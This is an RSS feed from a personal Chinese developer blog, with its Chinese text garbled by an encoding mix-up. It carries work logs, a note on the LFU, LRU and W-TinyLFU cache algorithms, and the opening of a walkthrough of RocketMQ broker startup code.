<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
    <channel>
        <title>Smelly fish Rotten shrimp ğŸ““</title>
        <link>https://sdttttt.github.io/</link>
        <description>Recent content on Smelly fish Rotten shrimp ğŸ““</description>
        <generator>Hugo -- gohugo.io</generator>
        <language>zh-cn</language>
        <copyright>Copyright Â© 2020, SDTTTTT.</copyright>
        <lastBuildDate>Tue, 03 Nov 2020 14:28:39 +0800</lastBuildDate><atom:link href="https://sdttttt.github.io/index.xml" rel="self" type="application/rss+xml" /><item>
        <title>GRC 3</title>
        <link>https://sdttttt.github.io/p/grc-3/</link>
        <pubDate>Tue, 03 Nov 2020 14:28:39 +0800</pubDate>
        
        <guid>https://sdttttt.github.io/p/grc-3/</guid>
        <description>&lt;p&gt;ä¸Šå‘¨æœ«ç®—æ˜¯æŠŠGRCæ‰©å±•çš„éƒ¨åˆ†å¼€å‘å®Œæˆäº†ï¼Œ
æœ€å¼€å§‹å†™çš„æ—¶å€™æ²¡æœ‰é‡åˆ°ä»€ä¹ˆç‰¹åˆ«å¤§çš„å›°éš¾ï¼Œ
ä¸ç¦æ„Ÿå¹ï¼Œæˆ‘å†™Rustè¶Šæ¥è¶Šé¡ºæ‰‹äº†å·²ç».&lt;/p&gt;
&lt;p&gt;ç»“æœåˆ°æ˜ŸæœŸå…­å‡†å¤‡æŠŠå‡ ä¸ªæ¨¡å—æ¥èµ·æ¥çš„æ—¶å€™ï¼Œ
å‘ç°å‡ºç°äº†å˜é‡ç”Ÿå‘½å‘¨æœŸçš„é—®é¢˜ï¼Œæˆ‘è¿˜ç‰¹åœ°å»æ‰¾äººé—®ï¼Œ
ä½†æ ¹æœ¬æ²¡å•¥äººé¸Ÿæˆ‘ã€‚æ²¡åŠæ³•ï¼Œæœ€åç®—æ˜¯æœ‰æ„æ— æ„ä¹‹é—´å‘ç°äº†è§£å†³çš„æ–¹æ³•&amp;hellip;&lt;/p&gt;
&lt;p&gt;æœ€ååœ¨æ˜ŸæœŸå…­æ™šä¸Šæ€»ç®—æ˜¯ç¼–å†™å®Œæˆäº†å·²ç»ï¼Œæ˜ŸæœŸå¤©çš„æ—¶å€™å‘å¸ƒäº†ã€‚
å¯æƒœè¿™å‡ å¤©çš„ä¸‹è½½é‡éƒ½æ„äº‘æƒ¨æ·¡&amp;hellip;&lt;/p&gt;
</description>
        </item>
        <item>
        <title>Log 8</title>
        <link>https://sdttttt.github.io/p/log-8/</link>
        <pubDate>Thu, 29 Oct 2020 09:04:14 +0800</pubDate>
        
        <guid>https://sdttttt.github.io/p/log-8/</guid>
        <description>&lt;p&gt;æ¯å¤©ä¸Šç­, å…ˆéª‘15åˆ†é’Ÿè‡ªè¡Œè½¦åˆ°åœ°é“å†åš20å¤šåˆ†é’Ÿåœ°é“, é’ˆä¸æˆ³.&lt;/p&gt;
&lt;p&gt;æ„Ÿè§‰ä½“èƒ½ä¸‹é™çš„å‰å®³.&lt;/p&gt;
&lt;p&gt;ä»Šå¤©åœ¨åšå®¢ä»“åº“äº†å¢åŠ äº†hugoæ¨¡å—ã€‚ ä»¥åçœ‹èµ·æ¥è·Ÿæ¢ä¸»é¢˜ä¼šæ–¹ä¾¿å¾ˆå¤šã€‚
ä½†æ˜¯ä¸ºå•¥æœ‰&lt;code&gt;go.mod&lt;/code&gt;æ–‡ä»¶ã€‚è¿™åˆä¸æ˜¯ä¸€ä¸ªgoé¡¹ç›®&amp;hellip;&lt;/p&gt;
</description>
        </item>
        <item>
        <title>Log 7</title>
        <link>https://sdttttt.github.io/p/log-7/</link>
        <pubDate>Wed, 28 Oct 2020 09:54:22 +0800</pubDate>
        
        <guid>https://sdttttt.github.io/p/log-7/</guid>
        <description>&lt;p&gt;å°è¯•ä¼˜åŒ–ä¸€ä¸‹æ–‡ç« åˆ›å»ºçš„è„šæœ¬.&lt;/p&gt;
</description>
        </item>
        <item>
        <title>Log 6</title>
        <link>https://sdttttt.github.io/p/log-6/</link>
        <pubDate>Tue, 27 Oct 2020 17:24:55 +0800</pubDate>
        
        <guid>https://sdttttt.github.io/p/log-6/</guid>
        <description>&lt;p&gt;æœ€è¿‘ä»”ç»†åæ€äº†ä¸€ä¸‹, è¿˜æ˜¯å»ç ”ç©¶ä¸€äº›ä»€ä¹ˆä¸œè¥¿. sraftå·²ç»å†™çš„æˆ‘å¤´éƒ½å¤§äº†.
æˆ‘æ‰“ç®—æœ€è¿‘ä¸€æ®µæ—¶é—´ä¸å†åœ¨Githubä¸Šç¼–å†™ä»£ç äº†.&lt;/p&gt;
&lt;p&gt;ä¸€æ–¹é¢æ˜¯æ²¡æœ‰ä»€ä¹ˆä¸œè¥¿æ‰“å¾—èµ·æˆ‘çš„å…´è¶£, å¦ä¸€æ–¹é¢è¿˜æ˜¯è§‰å¾—è‡ªå·±æ²¡æœ‰çœŸæ­£æ“…é•¿çš„æ–¹é¢, ç ”ç©¶åˆ†å¸ƒå¼ç³»ç»Ÿè¿™ä¹ˆé•¿æ—¶é—´,
è¿›å±•çœŸçš„å¾ˆæ…¢, ä¸€æ˜¯æˆ‘å¹³æ—¶å¾ˆæ‡’, ä¸å–œæ¬¢æ­å¤æ‚çš„ç¯å¢ƒ, äºŒæ˜¯å•çº¯çš„åˆ†å¸ƒå¼æ–¹é¢çš„çŸ¥è¯†æ²¡æœ‰ä»€ä¹ˆè½¯ç”¨. éœ€è¦ç»“åˆå…¶ä»–æ–¹é¢.&lt;/p&gt;
&lt;p&gt;æ½œäº†æ½œäº†. (å½“ç„¶åšå®¢è¿˜æ˜¯ä¼šå†™www)&lt;/p&gt;
</description>
        </item>
        <item>
        <title>Cache Algorithm</title>
        <link>https://sdttttt.github.io/p/cache-algorithm/</link>
        <pubDate>Mon, 26 Oct 2020 11:03:33 +0800</pubDate>
        
        <guid>https://sdttttt.github.io/p/cache-algorithm/</guid>
        <description>&lt;p&gt;æœ¬æ–‡ä¸»è¦è®²çš„æ˜¯ç›®å‰å­˜åœ¨çš„å‡ ç§ç¼“å­˜ç®—æ³•, æ²¡é”™, æˆ‘åˆæ¥&lt;del&gt;è¯¯äººå­å¼Ÿ&lt;/del&gt;äº†.&lt;/p&gt;
&lt;p&gt;å†…å®¹ä¼šå›´ç»•è¿‘å‡ å¹´æ¯”è¾ƒæµè¡Œçš„LFU, LRU, è¿˜æœ‰W-TinyLRUè¿™ä¹ˆä¸‰ç§ç¼“å­˜ç®—æ³•æ¥è®², å°½é‡ä½¿ç”¨æœ€ç®€ç»ƒçš„æ–‡æœ¬.&lt;/p&gt;
&lt;h2 id=&#34;lfu&#34;&gt;LFU&lt;/h2&gt;
&lt;p&gt;è¿‘æœŸæœ€å°‘ä½¿ç”¨ç®—æ³•ï¼Œå³LFUç®—æ³•ï¼ˆLeast Frequently Used algorithmï¼‰ã€‚
è¿™ç§ç®—æ³•ä¼šæ·˜æ±°è¿‘æœŸæœ€å°‘è®¿é—®çš„ç¼“å­˜,
ä»”ç»†åˆ†æä¸€ä¸‹, æ²¡é”™ï¼Œè¿™æ˜¯ä¸€ç§éå¸¸åˆç†çš„ç®—æ³•ï¼Œå› ä¸ºåˆ°ç›®å‰ä¸ºæ­¢æœ€å°‘ä½¿ç”¨çš„é¡µé¢ï¼Œ
å¾ˆå¯èƒ½ä¹Ÿæ˜¯å°†æ¥æœ€å°‘è®¿é—®çš„é¡µé¢ã€‚
è¯¥ç®—æ³•æ—¢å……åˆ†åˆ©ç”¨äº†å†…å­˜ä¸­ç¼“å­˜è°ƒåº¦æƒ…å†µçš„å†å²ä¿¡æ¯ï¼Œåˆæ­£ç¡®åæ˜ äº†ç¨‹åºçš„å±€éƒ¨æ€§ã€‚&lt;/p&gt;
&lt;p&gt;ä½†æ˜¯ï¼Œè¿™ç§ç®—æ³•çš„å¼€é”€æå…¶é«˜, ä¸ºäº†è®°å½•æ¯ä¸ªç¼“å­˜çš„ä½¿ç”¨æƒ…å†µ, ä½ ä¸å¾—ä¸ä¸ºæ¯ä¸€ä¸ªç¼“å­˜å¢åŠ ä¸€ä¸ªå¾ˆå¤§çš„è®¡æ•°å™¨,
æ¯æ¬¡åˆ°è¾¾ä¸´ç•Œç‚¹, æˆ‘ä»¬è¿˜éœ€è¦æ‰¾åˆ°æ‰€æœ‰è®¡æ•°å™¨ä¸­æœ€å°‘çš„ç¼“å­˜, æ·˜æ±°å®ƒ.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;æ ¸å¿ƒæ€æƒ³ï¼šå¦‚æœä¸€ä¸ªæ•°æ®åœ¨æœ€è¿‘ä¸€æ®µæ—¶é—´å†…ä½¿ç”¨æ¬¡æ•°å¾ˆå°‘ï¼Œé‚£ä¹ˆåœ¨å°†æ¥ä¸€æ®µæ—¶é—´å†…è¢«ä½¿ç”¨çš„å¯èƒ½æ€§ä¹Ÿå¾ˆå°.
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;é€šå¸¸æˆ‘ä»¬ä¼šè¿™ä¹ˆå»å®ç°:&lt;/p&gt;
&lt;p&gt;å¤–éƒ¨ç»“æ„ä¸º&lt;code&gt;Array&lt;/code&gt;, å­˜å‚¨å…ƒç´ ä¸º&lt;code&gt;KV&lt;/code&gt;. &lt;code&gt;K&lt;/code&gt;: è¯¥ç¼“å­˜è®¿é—®æ¬¡æ•°. &lt;code&gt;V&lt;/code&gt;: ç¼“å­˜æœ¬èº«.
æ•°ç»„æŒ‰ç…§Kæ’åº. æ¯æ¬¡ç¼“å­˜å¤§å°å³å°†ä¸´ç•Œ, æ·˜æ±°&lt;code&gt;K&lt;/code&gt;æœ€å°çš„ç¼“å­˜.&lt;/p&gt;
&lt;p&gt;é¡ºä¾¿ä¸€æ &lt;code&gt;Window-LFU&lt;/code&gt; å®ƒæ˜¯LFUç®—æ³•çš„æ”¹è‰¯ç‰ˆ. LFUä¸­ç¼“å­˜çš„è®¿é—®æ¬¡æ•°è®°å½•çš„æ—¶é—´èŒƒå›´ä¸ºæ•´ä¸ªç¨‹åºçš„ç”Ÿå‘½å‘¨æœŸ,
åœ¨&lt;code&gt;Window-LFU&lt;/code&gt;ä¸­åªå¯¹ç‰¹å®šèŒƒå›´çš„è®¿é—®æ¬¡æ•°è¿›è¡Œæ·˜æ±°. (æ¯”å¦‚æœ€è¿‘10æ¬¡è®¿é—®çš„ç¼“å­˜.)&lt;/p&gt;
&lt;h2 id=&#34;lru&#34;&gt;LRU&lt;/h2&gt;
&lt;p&gt;æœ€ä¹…æ²¡æœ‰ä½¿ç”¨ç®—æ³•ï¼Œå³LRUç®—æ³•ï¼ˆLeast Recently Used algorithmï¼‰ã€‚
è¿™ç§ç®—æ³•æŠŠè¿‘æœŸæœ€ä¹…æ²¡æœ‰è¢«è®¿é—®è¿‡çš„é¡µé¢ä½œä¸ºè¢«æ›¿æ¢çš„é¡µé¢ã€‚
å®ƒæŠŠLFUç®—æ³•ä¸­è¦è®°å½•æ•°é‡ä¸Šçš„&amp;quot;å¤š&amp;quot;ä¸&amp;quot;å°‘&amp;quot;ç®€åŒ–æˆåˆ¤æ–­&amp;quot;æœ‰&amp;quot;ä¸&amp;quot;æ— &amp;quot;ï¼Œå› æ­¤ï¼Œå®ç°èµ·æ¥æ¯”è¾ƒå®¹æ˜“ã€‚&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;æ ¸å¿ƒæ€æƒ³ï¼šå¦‚æœåœ¨ä¸€æ®µæ—¶é—´å†…é•¿æ—¶é—´ä¸è®¿é—®çš„é¡µé¢å°†æ¥ä¹Ÿä¸ä¼šè®¿é—®.
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;å®ç°å¾ˆç®€å•:&lt;/p&gt;
&lt;p&gt;å‡è®¾æˆ‘ä»¬çš„ç¼“å­˜å®¹é‡å¤§å°ä¸º2, æœ€å¤šç¼“å­˜2ä¸ªå…ƒç´ .
ä¸‹é¢æ˜¯ç¼“å­˜çš„è®¿é—®é¡ºåº.&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;1 2 2 3&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;ç¬¬ä¸€æ¬¡: [1]&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;ç¬¬äºŒæ¬¡: [2, 1]&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;ç¬¬ä¸‰æ¬¡: [2, 1]&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;ç¬¬å››æ¬¡: [3, 2]&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;æœ€æ–°è®¿é—®çš„ç¼“å­˜ä¼šæ”¾åœ¨é¦–ä½, å¾ˆä¹…æ²¡æœ‰è®¿é—®çš„ç¼“å­˜è‡ªç„¶è€Œç„¶çš„å°±åˆ°äº†æœ«å°¾, ç„¶åè¢«æ·˜æ±°.&lt;/p&gt;
&lt;h2 id=&#34;w-tinylru&#34;&gt;W-TinyLRU&lt;/h2&gt;
&lt;p&gt;çŸ¥åç¼“å­˜æ¡†æ¶ caffeine å°±æ˜¯ä½¿ç”¨çš„è¿™ç§ç®—æ³• è¿™ç§ç®—æ³•ç»“åˆLRUå’ŒLFUç®—æ³•ï¼Œè§£å†³äº†çªå‘æµé‡é—®é¢˜å¸¦æ¥çš„ã€‚&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;æ•´ä¸ªç®—æ³•æ•°æ®ç»“æ„åˆ†æˆä¸‰ä¸ªæ®µ,åˆ†åˆ«ä¸º  Eden,Probation,Protected ä¸‰ä¸ªé˜Ÿåˆ—
&lt;/code&gt;&lt;/pre&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;Edené˜Ÿåˆ—: åœ¨caffeineä¸­è§„å®šåªèƒ½ä¸ºç¼“å­˜å®¹é‡çš„%1,å¦‚æœsize=100,
é‚£è¿™ä¸ªé˜Ÿåˆ—çš„æœ‰æ•ˆå¤§å°å°±ç­‰äº1ã€‚è¿™ä¸ªé˜Ÿåˆ—ä¸­è®°å½•çš„æ˜¯æ–°åˆ°çš„æ•°æ®ï¼Œ
é˜²æ­¢çªå‘æµé‡ç”±äºä¹‹å‰æ²¡æœ‰è®¿é—®é¢‘ç‡ï¼Œè€Œå¯¼è‡´è¢«æ·˜æ±°ã€‚
æ¯”å¦‚æœ‰ä¸€éƒ¨æ–°å‰§ä¸Šçº¿ï¼Œåœ¨æœ€å¼€å§‹å…¶å®æ˜¯æ²¡æœ‰è®¿é—®é¢‘ç‡çš„ï¼Œ
é˜²æ­¢ä¸Šçº¿ä¹‹åè¢«å…¶ä»–ç¼“å­˜æ·˜æ±°å‡ºå»ï¼Œè€ŒåŠ å…¥è¿™ä¸ªåŒºåŸŸã€‚&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Probationé˜Ÿåˆ—:å«åšç¼“åˆ‘é˜Ÿåˆ—ï¼Œåœ¨è¿™ä¸ªé˜Ÿåˆ—å°±ä»£è¡¨ä½ çš„æ•°æ®ç›¸å¯¹æ¯”è¾ƒå†·ï¼Œé©¬ä¸Šå°±è¦è¢«æ·˜æ±°äº†ã€‚&lt;br&gt;
è¿™ä¸ªæœ‰æ•ˆå¤§å°ä¸ºsizeå‡å»edenå‡å»protectedã€‚&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Protectedé˜Ÿåˆ—:åœ¨è¿™ä¸ªé˜Ÿåˆ—ä¸­ï¼Œå¯ä»¥ç¨å¾®æ”¾å¿ƒä¸€ä¸‹äº†ï¼Œä½ æš‚æ—¶ä¸ä¼šè¢«æ·˜æ±°ï¼Œ
ä½†æ˜¯åˆ«æ€¥ï¼Œå¦‚æœProbationé˜Ÿåˆ—æ²¡æœ‰æ•°æ®äº†æˆ–è€…Protectedæ•°æ®æ»¡äº†ï¼Œ
ä½ ä¹Ÿå°†ä¼šè¢«é¢ä¸´æ·˜æ±°çš„å°´å°¬å±€é¢ã€‚å½“ç„¶æƒ³è¦å˜æˆè¿™ä¸ªé˜Ÿåˆ—ï¼Œ
éœ€è¦æŠŠProbationè®¿é—®ä¸€æ¬¡ä¹‹åï¼Œå°±ä¼šæå‡ä¸ºProtectedé˜Ÿåˆ—ã€‚
è¿™ä¸ªæœ‰æ•ˆå¤§å°ä¸º(sizeå‡å»eden) X 80% å¦‚æœsize =100ï¼Œå°±ä¼šæ˜¯79ã€‚&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;åŒºåŸŸè§„åˆ™:&lt;/strong&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;æ‰€æœ‰çš„æ–°æ•°æ®éƒ½ä¼šè¿›å…¥Edenã€‚&lt;/li&gt;
&lt;li&gt;Edenæ»¡äº†ï¼Œæ·˜æ±°è¿›å…¥Probationã€‚&lt;/li&gt;
&lt;li&gt;å¦‚æœåœ¨Probationä¸­è®¿é—®äº†å…¶ä¸­æŸä¸ªæ•°æ®ï¼Œåˆ™è¿™ä¸ªæ•°æ®å‡çº§ä¸ºProtectedã€‚&lt;/li&gt;
&lt;li&gt;å¦‚æœProtectedæ»¡äº†åˆä¼šç»§ç»­é™çº§ä¸ºProbationã€‚&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;Probationçš„æ·˜æ±°ç®—æ³•ä¹Ÿæ¯”è¾ƒæœ‰æ„æ€, å–å‡ºé˜Ÿå°¾å’Œé˜Ÿé¦–çš„å…ƒç´ , ç„¶åè®©è¿™ä¸¤çš‡åŸPK, è¾“äº†å°±æ·˜æ±°äº†.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;çš‡åŸPKè§„åˆ™:&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;1.å¦‚æœé˜Ÿå°¾å…ƒç´ çš„é¢‘åº¦å¤§äºé˜Ÿé¦–ï¼Œé‚£ä¹ˆå°±ç›´æ¥æ·˜æ±°é˜Ÿé¦–ï¼Œ

2.å½“é˜Ÿå°¾é¢‘åº¦å°äºç­‰äºé˜Ÿé¦–ï¼Œä¸”é¢‘åº¦å°äº5çš„æ—¶å€™ï¼Œç›´æ¥å°†å…¶æ·˜æ±°

3.å½“é˜Ÿå°¾é¢‘åº¦å°äºç­‰äºé˜Ÿé¦–ï¼Œä¸”é¢‘åº¦å¤§äº5çš„æ—¶å€™ï¼Œé€šè¿‡éšæœºçš„æ–¹å¼è¿›è¡Œæ·˜æ±°ä»»æ„ä¸€ä¸ªã€‚(çœ‹è°è¿æ°”å¥½å’¯)
&lt;/code&gt;&lt;/pre&gt;
</description>
        </item>
        <item>
        <title>Log 5</title>
        <link>https://sdttttt.github.io/p/log-5/</link>
        <pubDate>Fri, 23 Oct 2020 16:44:07 +0800</pubDate>
        
        <guid>https://sdttttt.github.io/p/log-5/</guid>
        <description>&lt;p&gt;ä»Šå¤©å†™äº†ä¸€å¤©çš„sraft. æœ¬æ¥æ˜¯è‡ªä¿¡æ»¡æ»¡ï¼Œä½†æ˜¯æœ‰äº›åœ°æ–¹çš„è®¾è®¡çœŸçš„è®©æˆ‘ç„¦å¤´çƒ‚é¢.&lt;/p&gt;
&lt;p&gt;ä»Šå¤©æŠŠsraftçš„rpcçš„ç½‘ç»œé€šä¿¡éƒ¨åˆ†æ¢æˆäº†é•¿è¿æ¥ã€‚
ä½†æ˜¯å†™åˆ°èŠ‚ç‚¹å‘ç°çš„éƒ¨åˆ†åˆæœ‰é—®é¢˜æ¥äº†ï¼Œæˆ‘æ²¡æœ‰å†™å…³äºå¤„ç†èŠ‚ç‚¹å‘ç°ä¹‹ç±»çš„æ¨¡å—ï¼Œ
è‡³ä»Šéƒ½æ˜¯æŒ‰ç…§raftè®ºæ–‡ä¸Šçš„åŸºç¡€ç†è®ºæ¥å®ç°çš„ã€‚&lt;/p&gt;
&lt;p&gt;è¿™ä¸€å—åˆè¦æ€ä¹ˆè®¾è®¡å‘¢&amp;hellip;
æœç„¶æœ‰äº›åœ°æ–¹å†™çš„è¿˜æ˜¯å¤ªå¤æ‚äº†ä¹ˆ.&lt;/p&gt;
</description>
        </item>
        <item>
        <title>Log 4</title>
        <link>https://sdttttt.github.io/p/log-4/</link>
        <pubDate>Thu, 22 Oct 2020 09:26:05 +0800</pubDate>
        
        <guid>https://sdttttt.github.io/p/log-4/</guid>
        <description>&lt;p&gt;æ˜¨å¤©ç®—æ˜¯å®Œæˆäº†ç¬¬ä¸€ä¸ªå‰ç«¯ä¸Šéœ€æ±‚.æ¥è®²è®²æˆæœå§.
(å…¶å®æ ¹æœ¬æ— å…³ç´§è¦)&lt;/p&gt;
&lt;p&gt;çœ‹äº†SVNè®°å½•,æ•´ä¸ªé¡¹ç›®ç¬¬ä¸€æ¬¡æäº¤æ˜¯åœ¨2018å¹´. (ç«‹é¡¹çš„æ—¶é—´æ„Ÿè§‰è‚¯å®šæ›´æ—©)&lt;/p&gt;
&lt;p&gt;æ•´ä½“æŠ€æœ¯ä½¿ç”¨çš„åŸºæœ¬æ—¶åŸç”ŸJS(æ²¡æœ‰ES6) + Jquery. é¡¹ç›®ä»£ç é£æ ¼å‡Œä¹±. è‚¯å®šæœ‰å¥½å‡ ä¸ªäººæ¥æ‰‹è¿‡äº†.&lt;/p&gt;
&lt;p&gt;æ¯ä¸ªé¡µé¢è¿˜ä¸æ˜¯HTML&amp;hellip;æ˜¯nmçš„JSP.(æ‰€ä»¥æˆ‘æ‰è§‰å¾—åº”è¯¥ä¸æ˜¯2018å¹´ç«‹é¡¹çš„)
æ‰€ä»¥æ•´ä¸ªé¡¹ç›®éƒ½æ˜¯åœ¨Tomcatä¸Šè¿è¡Œçš„.æ­£å¸¸æ¥è¯´éƒ½æ˜¯å†™æˆHTMLç„¶åè·‘åœ¨Nginxä¸Š.&lt;/p&gt;
&lt;p&gt;è¿™æ¬¡çš„éœ€æ±‚å°±æ˜¯åœ¨åŸæ¥çš„é¡µé¢ä¸ŠåŠ ä¸€ä¸ªæ–°çš„æŒ‰é’®å¹¶ä¸”å®Œå–„æ•´ä¸ªé¡µé¢. æˆ‘çœ‹æ¥é‚£ä¸ªé¡µé¢çš„å…¶ä»–æ ‡ç­¾.ç”¨çš„åŸºæœ¬æ˜¯ç»å¯¹å®šä½å¸ƒå±€..æƒŠäº†&lt;/p&gt;
&lt;p&gt;è¿™æ¬¡æˆ‘åŸºæœ¬æŠŠåŸç”ŸJSå®Œå…¨å¤ä¹ äº†ä¸€é. æˆ‘ä¸å¤ªå–œæ¬¢ä½¿ç”¨Jquery.å› ä¸ºæ„Ÿè§‰è¯­æ³•å¾ˆå¥‡æ€ª, å¯è¯»æ€§å¾ˆå·®.&lt;/p&gt;
&lt;p&gt;è¿˜å­¦åˆ°äº†ä¸€ä¸ªæ–°çš„åº“(GoJS)ç”¨æ¥ç”»å›¾çš„.è¿™ä¸ªåº“å…¥é—¨å¾ˆç®€å•,ä½†æ˜¯è¦é«˜åº¦è‡ªå®šä¹‰ä½¿ç”¨è¿˜æ˜¯æœ‰äº›å›°éš¾çš„.&lt;/p&gt;
&lt;p&gt;å”‰, æˆ‘åˆ°åº•å•¥æ—¶å€™æ‰èƒ½å†™åç«¯å˜.&lt;/p&gt;
</description>
        </item>
        <item>
        <title>Log 3</title>
        <link>https://sdttttt.github.io/p/log-3/</link>
        <pubDate>Wed, 21 Oct 2020 08:55:36 +0800</pubDate>
        
        <guid>https://sdttttt.github.io/p/log-3/</guid>
        <description>&lt;p&gt;ç»†å¿ƒçš„äººå¯èƒ½æ³¨æ„åˆ°æˆ‘è¿™å‡ å¤©éƒ½åœ¨å†™JS, å› ä¸ºè¿™è¾¹çš„å…¬å¸äººæ‰‹å…¶å®ç¼ºä¹å¾ˆä¸¥é‡,
å¾ˆå¤šéƒ½æ˜¯åšåç«¯çš„, è€Œä¸”åç«¯å¹¶ä¸æ˜¯å…¨éƒ¨Java, æœ‰ç›¸å½“éƒ¨åˆ†æ˜¯Pythonå†™çš„.&lt;/p&gt;
&lt;p&gt;æˆ‘åœ¨å¤§å­¦æœŸé—´ä¸ºäº†é€‰æ‹©ä»¥åçš„WEBæ–¹å‘, ä¸€ç‹ å¿ƒæŠŠå½“æ—¶æ¯”è¾ƒå‰æ²¿çš„WEBæŠ€æœ¯å…¨éƒ¨å­¦äº†ä¸€é, åŒ…æ‹¬å‰ç«¯çš„ä¸€äº›æ¡†æ¶,
æœ€åé€‰æ‹©äº†WEBåç«¯, è¯­è¨€ä¸ºGo, æˆ–è€…Java. ä¹Ÿç®—åŠä¸ªå…¨æ ˆå§.&lt;/p&gt;
&lt;p&gt;è¿™ä¸ªå…¬å¸æ­£å¥½æ˜¯å‘æŒ¥äº†æˆ‘æ‰€æœ‰çš„æŠ€èƒ½..ä¸è¿‡è¿™è¾¹çš„JSå¤§éƒ¨åˆ†éƒ½æ˜¯åŸç”Ÿçš„, æˆ‘æ¯”è¾ƒä¹ æƒ¯ç”¨ES6çš„å†™æ³•.&lt;/p&gt;
</description>
        </item>
        <item>
        <title>RocketMQ 3.3.4 Broker</title>
        <link>https://sdttttt.github.io/p/rocketmq-3.3.4-broker/</link>
        <pubDate>Tue, 13 Oct 2020 16:56:11 +0800</pubDate>
        
        <guid>https://sdttttt.github.io/p/rocketmq-3.3.4-broker/</guid>
        <description>&lt;p&gt;å·®ä¸å¤šå¯ä»¥çœ‹æ¶ˆæ¯é˜Ÿåˆ—çš„æºç äº†ã€‚
åœ¨ä¸‹ä»giteeä¸Šæ‰¾åˆ°äº†rocketmqçš„æ—©æœŸç‰ˆæœ¬ï¼ˆ3.2.2ï¼‰ï¼Œ
åæ¶ˆæ¯æ˜¯è¿™ä¸ª2014å¹´çš„é¡¹ç›®é‡Œæ²¡æœ‰å•å…ƒæµ‹è¯•æå°‘, è°ƒè¯•ä¼šæ¯”è¾ƒå›°éš¾.
å¥½æ¶ˆæ¯æ˜¯è¿™ä¸ªæ—¶å€™çš„RocketMQè¿˜æ²¡å¼€æºå¤šä¹…ï¼Œé‡Œé¢æœ‰å¾ˆå¤šä¸­æ–‡æ³¨é‡Šã€‚çœ‹èµ·æ¥ä¼šå¾ˆèˆ’æœã€‚&lt;/p&gt;
&lt;p&gt;æˆ‘ä»¬ä»Brokerå¼€å§‹æ¶‚é¸¦ã€‚å…³äºRocketMQä¸­æ¯ä¸ªè§’è‰²çš„ä½œç”¨è¿™é‡Œä¸å†é™ˆè¿°ï¼š&lt;/p&gt;
&lt;p&gt;å…ˆä»åˆå§‹åŒ–å¼€å§‹ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-Java&#34; data-lang=&#34;Java&#34;&gt;    &lt;span class=&#34;kd&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;kd&#34;&gt;static&lt;/span&gt; &lt;span class=&#34;kt&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;String&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;[]&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;args&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
        &lt;span class=&#34;n&#34;&gt;start&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;createBrokerController&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;args&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;));&lt;/span&gt;
    &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;rocketmqæ˜¯ä»&lt;code&gt;commandline&lt;/code&gt;å¯åŠ¨çš„ï¼Œ&lt;code&gt;createBrokerController&lt;/code&gt;å‡½æ•°æ¯”è¾ƒé•¿ï¼Œ
ä¼šæœ‰å¾ˆå¤šé¢å¤–çš„é€»è¾‘å¹²æ‰°ä½ ï¼Œæˆ‘è¿™é‡Œç›´æ¥è¯´é‡ç‚¹ï¼š&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;è¯»å–ç¯å¢ƒå˜é‡ï¼Œæ²¡æœ‰å°±ç”¨é»˜è®¤å€¼ã€‚&lt;/li&gt;
&lt;li&gt;è§£æå‘½ä»¤è¡Œå‚æ•°ã€‚&lt;/li&gt;
&lt;li&gt;åˆå§‹åŒ–é…ç½®ç±»ã€‚&lt;/li&gt;
&lt;li&gt;æ‰“å°é»˜è®¤é…ç½®å†…å®¹ã€‚&lt;/li&gt;
&lt;li&gt;æ£€æŸ¥NameServeråœ°å€è®¾ç½®æ˜¯å¦æ­£ç¡®ã€‚&lt;/li&gt;
&lt;li&gt;æ£€æŸ¥brokerçš„ç±»å‹ï¼ˆmasterï¼Œslaveï¼‰&lt;/li&gt;
&lt;li&gt;åˆå§‹åŒ–æ—¥å¿—é…ç½®ç±»ã€‚&lt;/li&gt;
&lt;li&gt;å†æ¬¡æ‰“å°ã€‚&lt;/li&gt;
&lt;li&gt;åˆå§‹åŒ–æœåŠ¡æ§åˆ¶å¯¹è±¡.&lt;/li&gt;
&lt;li&gt;æœ€åå¢åŠ ä¸€ä¸ªå…³é—­Brokeræ—¶è§¦å‘çš„hook.&lt;/li&gt;
&lt;/ul&gt;
&lt;blockquote&gt;
